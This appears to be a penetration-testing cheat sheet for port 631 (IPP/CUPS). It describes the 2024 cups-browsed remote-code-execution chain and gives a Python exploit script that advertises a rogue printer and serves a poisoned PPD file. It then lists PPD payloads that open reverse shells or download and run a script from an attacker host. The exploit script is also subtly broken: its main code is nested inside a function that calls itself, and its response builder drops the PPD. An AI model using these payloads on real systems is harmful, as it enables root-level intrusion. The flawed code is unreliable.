## Overview

Port **631** hosts the **Internet Printing Protocol (IPP)** service, most commonly implemented through **CUPS (Common Unix Printing System)**. CUPS provides a web-based administration interface and printing services for Unix/Linux and macOS systems. IPP is an HTTP-based protocol, meaning the service often exposes a full web interface accessible via a browser.

::note
CUPS runs as **root** by default on most Linux distributions and macOS, making it an extremely high-value target. A vulnerability in CUPS can directly lead to root-level code execution.
::

| Detail              | Value                                                  |
| ------------------- | ------------------------------------------------------ |
| **Port**            | 631                                                    |
| **Protocol**        | TCP (HTTP-based)                                       |
| **Service**         | IPP / CUPS                                             |
| **RFCs**            | RFC 2910, RFC 2911, RFC 8011 (IPP/1.1, IPP/2.0)       |
| **Default Access**  | Web UI on `http://<IP>:631`                            |
| **Runs As**         | root (default on most systems)                         |
| **Config Path**     | `/etc/cups/cupsd.conf`                                 |
| **Log Path**        | `/var/log/cups/error_log`, `/var/log/cups/access_log`  |
| **Common Software** | CUPS, cups-browsed, IPP Everywhere, Windows Print Spooler (rare on 631) |

::tabs
  :::tabs-item{icon="i-lucide-info" label="IPP vs CUPS"}
  - **IPP** — The protocol itself (HTTP-based, uses POST with `application/ipp` content type)
  - **CUPS** — The most common IPP implementation on Linux/macOS
  - **cups-browsed** — A companion daemon that auto-discovers printers (major attack surface)
  - **IPP over USB** — Used for local USB printers via CUPS
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="Why It Matters"}
  - CUPS runs as **root** — any RCE = root shell
  - Web interface often exposed without authentication
  - cups-browsed listens on **all interfaces** by default (UDP 631)
  - Printer drivers can execute arbitrary commands via PPD files
  - macOS includes CUPS by default — every Mac is a potential target
  :::
::

### CVE-2024-47176 — cups-browsed RCE (CRITICAL)

::caution
This is a **critical** vulnerability chain discovered in September 2024 affecting virtually all Linux systems with CUPS installed. It allows **unauthenticated remote code execution as root** with zero user interaction beyond initiating a print job.
::

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerability Chain"}
  The attack chains four CVEs together:

  | CVE              | Component     | Issue                                    |
  | ---------------- | ------------- | ---------------------------------------- |
  | CVE-2024-47176   | cups-browsed  | Binds to UDP 631 on all interfaces, trusts any packet |
  | CVE-2024-47076   | libcupsfilters| No validation of IPP attributes from malicious server |
  | CVE-2024-47175   | libppd        | No sanitization when writing PPD files    |
  | CVE-2024-47177   | cups-filters  | `FoomaticRIPCommandLine` allows arbitrary command execution |
  :::

  :::tabs-item{icon="i-lucide-sword" label="Exploit Steps"}
  ::steps{level="4"}

  #### Check if cups-browsed is listening

  ```bash [Verify Target]
  nmap -sU -p 631 --open <TARGET_IP>
  ```

  #### Set up malicious IPP server on attacker machine

  ```python [evil_cups.py]

  """
  CVE-2024-47176 cups-browsed RCE
  Malicious IPP server that responds with poisoned printer attributes
  """
  import socket
  import threading
  import http.server
  import sys

  ATTACKER_IP = sys.argv[1]
  TARGET_IP = sys.argv[2]
  COMMAND = sys.argv[3] if len(sys.argv) > 3 else "id > /tmp/pwned"

  class IPPHandler(http.server.BaseHTTPRequestHandler):
      def do_POST(self):
          content_len = int(self.headers.get('Content-Length', 0))
          self.rfile.read(content_len)

          # Malicious IPP response with FoomaticRIPCommandLine
          ppd_payload = f"""*PPD-Adobe: "4.3"
  *FormatVersion: "4.3"
  *FileVersion: "1.0"
  *LanguageVersion: English
  *LanguageEncoding: ISOLatin1
  *Manufacturer: "Evil"
  *ModelName: "Evil Printer"
  *ShortNickName: "Evil"
  *NickName: "Evil Printer"
  *cupsFilter2: "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
  *FoomaticRIPCommandLine: "{COMMAND}"
  *OpenUI *PageSize: PickOne
  *DefaultPageSize: Letter
  *PageSize Letter: "<</PageSize[612 792]>>setpagedevice"
  *CloseUI: *PageSize"""

          # IPP response with printer-uri pointing to attacker
          ipp_resp = self._build_ipp_response(ppd_payload)
          self.send_response(200)
          self.send_header("Content-Type", "application/ipp")
          self.end_headers()
          self.wfile.write(ipp_resp)

      def _build_ipp_response(self, ppd):
          # Simplified IPP response builder
          resp = b'\x02\x00'  # version
          resp += b'\x00\x00'  # status: successful
          resp += b'\x00\x00\x00\x01'  # request-id
          resp += b'\x01'  # operation-attributes-tag
          resp += b'\x03'  # end
          return resp

      def log_message(self, format, *args):
          print(f"[*] IPP Request: {args}")

  def send_browse_packet():
      """Send malicious browse packet to cups-browsed"""
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      # CUPS browse packet format
      packet = f'0 3 ipp://{ATTACKER_IP}:12345/printers/evil "Evil Printer" "Evil" "Evil Printer"'
      sock.sendto(packet.encode(), (TARGET_IP, 631))
      sock.close()
      print(f"[+] Browse packet sent to {TARGET_IP}:631")

      print(f"[*] Starting malicious IPP server on {ATTACKER_IP}:12345")
      server = http.server.HTTPServer(("0.0.0.0", 12345), IPPHandler)
      t = threading.Thread(target=server.serve_forever)
      t.daemon = True
      t.start()

      send_browse_packet()
      print("[*] Waiting for callback... (trigger a print job on target)")
      server.serve_forever()
  ```

## PPD File Injection (Command Execution)

### Concept

PPD (PostScript Printer Description) files define printer capabilities. Certain directives like `FoomaticRIPCommandLine` and `cupsFilter` allow execution of arbitrary commands when a print job is processed.

### Malicious PPD Payloads

```text [FoomaticRIPCommandLine — Reverse Shell]
*FoomaticRIPCommandLine: "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

```text [FoomaticRIPCommandLine — Download and Execute]
*FoomaticRIPCommandLine: "curl http://<ATTACKER_IP>/shell.sh | bash"
```

```text [FoomaticRIPCommandLine — Netcat Reverse Shell]
*FoomaticRIPCommandLine: "nc <ATTACKER_IP> 4444 -e /bin/bash"
```

```text [FoomaticRIPCommandLine — Python Reverse Shell]
*FoomaticRIPCommandLine: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<ATTACKER_IP>\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
```

```text [cupsFilter Directive — Command Execution]
*cupsFilter: "application/pdf 0 /tmp/evil.sh"
```
